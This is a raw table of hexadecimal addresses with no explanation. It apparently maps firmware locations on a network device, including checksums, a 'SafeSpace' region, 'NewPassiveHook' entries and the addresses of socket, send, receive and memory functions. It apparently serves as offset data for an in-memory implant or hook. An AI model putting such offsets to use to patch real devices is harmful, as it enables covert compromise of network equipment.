0x2516053C
0xffffffff
0x0     0x00644284
0x1     0x006433C8
0x3     0x0063E58C
0x6     0x00344000
0x7     0x00EF169C
0x8     0x0039BDD0
0x9     0x00399FBC
0xa     0x00EF1F10
0xf     0x00DE3BD0
0x15    0x00380278
0x17    0x0037F0BC
0x19    0x0038AACC
0x20    0x0035D39C
0x21    0x0037030C
0x22    0x02100850
0x23    0x00061C00
0x24    0x0008362C
0x25    0x48061C03
0x26    0x0210082C
0x28    0x02315FE0
0x29    0x00C24AA4
0x2f    0x027575E8
0x30    0x00000018
0x31    0x00000034
0x32    0x00000094
0x33    0x00000000
0x34    0x00000070
0x35    0x02038034
0x3b    0x003A5B7C
0x3c    0x003A5F20
0x3d    0x003A540C
0x3e    0x003A6228
0x3f    0x00C27B8C
:EOS:
ArpTableAddrPtr      0x02767D4C
ConfigAddr           0x0276CAE4
PingPtr              0x02228AD0
SafeSpace            0x01FCE000
ImgCkSum             0x00AA553C
CodeCkSum            0x3C621397
SystemCkSum          0xD860F3DE
TimeTablePtr         0x0279B51C
LogTablePtr          0x0276F0C0
LogOptsPtr           0x0276F4D4
CritTablePtr         0x0276F4D0
MixedConfig          0x009845A8
SerialStrPtr         0x02798C00
NewPassiveHookFunc   0x0038F330
NewPassiveHookLoc    0x0098D410
NewPassiveHookRepl   0x48061C03
flashSemAddr         0x03752734
flashSemUseOffset    0x00000018
Printf               0x00EF1F10
Socket               0x0064B7C8
Bind                 0x0064C5A0
Connect              0x0064E6A0
Send                 0x0064EEE0
Recv                 0x0064F4F8
Close                0x0064FA08
Malloc               0x0039BDD0
Free                 0x00399FBC
Resched              0x00370000
:EOS:

